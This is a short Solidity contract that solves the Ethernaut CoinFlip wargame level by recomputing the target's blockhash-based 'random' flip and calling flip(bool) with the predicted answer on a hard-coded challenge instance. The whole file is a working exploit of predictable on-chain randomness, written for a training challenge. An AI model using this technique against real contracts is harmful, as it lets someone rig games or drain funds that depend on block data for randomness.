// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract CoinFlipAttack {
    //address of our instance in Ethernauts challenge
    address targetAddress = 0x09b328D7082Bd00Cd83c77E43a239c87a54bd752;
    //got this factor from the challenge's original contract
    uint256 factor =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        //this code is the same that the original contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;

        bool side = coinFlip == 1 ? true : false;
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = targetAddress.call{value: 0 ether}(payload);
        //we require that the transaccion is a win or else dont go thru
        require(
            success,
            "Transaction call using encodeWithSignature is successful"
        );
    }
}
